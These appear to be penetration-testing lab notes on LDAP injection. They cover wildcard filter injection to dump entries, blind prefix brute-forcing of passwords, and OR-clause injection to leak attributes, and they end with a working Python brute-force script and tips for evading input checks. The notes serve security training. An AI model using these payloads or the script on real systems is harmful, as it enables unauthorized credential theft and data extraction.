# LDAP - Data Exfiltration & Blind Exploitation

When LDAP results are rendered, wildcarding attributes can dump broad data. When nothing is rendered, use blind techniques (response-difference) similar to blind SQLi.

## Visible Results (Straightforward Exfiltration)

Given a filter like:

```ldap
(&(uid=admin)(objectClass=account))
```

Inject wildcard to match all users:

```ldap
(&(uid=*)(objectClass=account))
```

Or widen an OR branch:

```ldap
(|(objectClass=organization)(objectClass=*)))
```

## Blind Exploitation (Response-Based)

Assume login filter:

```ldap
(&(uid=htb-stdnt)(password=p@ssw0rd))
```

- Identify positive vs negative responses (e.g., "Login successful ... down for security reasons" vs "Login failed!").
- Confirm injection: `password=*` → positive response.

### Password brute-force (prefix search)

Test first char using wildcard suffix:

```ldap
(&(uid=htb-stdnt)(password=a*))
```

Loop over candidate chars until positive; fix the char and proceed to next position:

```ldap
(&(uid=htb-stdnt)(password=p@*))
```

Repeat until the response stops flipping (full value found).

### Attribute exfiltration via injected OR

Leak attribute of a user by short-circuiting around the password check. Example payloads:

- Username: `htb-stdnt)(|(description=*`
- Password: `invalid)`

Effective filter:

```ldap
(&(uid=htb-stdnt)(|(description=*)(password=invalid)))
```

Now brute-force `description` one character at a time with `prefix*` tests (same approach as password).

## Automation Script (example)

```python
import requests, string

URL = "http://STMIP:STMPO/index.php"
POSITIVE_STRING = "Login successful"
EXFILTRATE_USER = 'admin'
EXFILTRATE_ATTRIBUTE = 'description'

if __name__ == '__main__':
	flag = ''
	while True:
		found_char = False
		for c in string.printable:
			username = f"{EXFILTRATE_USER})(|({EXFILTRATE_ATTRIBUTE}={flag}{c}*"
			password = 'invalid)'
			r = requests.post(URL, data={'username': username, 'password': password})
			if POSITIVE_STRING in r.text:
				flag += c
				found_char = True
				break
		if not found_char:
			print(flag)
			break
```

- Adjust `POSITIVE_STRING` to match the app's positive response phrase exactly.
- Narrow `string.printable` to speed up.
- URL-encode when needed if the app rejects raw parenthesis.

> Redact flags/secrets in notes; store sensitive outputs separately.
